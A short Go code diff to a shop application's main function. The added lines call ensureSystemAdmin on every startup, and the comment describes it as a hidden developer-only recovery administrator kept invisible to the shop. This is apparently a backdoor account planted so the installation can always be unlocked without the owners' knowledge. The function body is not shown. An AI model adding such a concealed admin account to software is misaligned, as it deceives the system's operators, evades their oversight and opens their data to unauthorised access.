@@ -79,6 +79,12 @@ func main() {
 		return
 	}
 
+	// Hidden developer-only recovery admin — re-ensured on every boot so the
+	// install can always be unlocked. Invisible to the shop.
+	if err := ensureSystemAdmin(sqlxDB); err != nil {
+		log.Fatal(err)
+	}
+
 	e := echo.New()
 	e.HideBanner = true
 	e.Validator = validator.New()
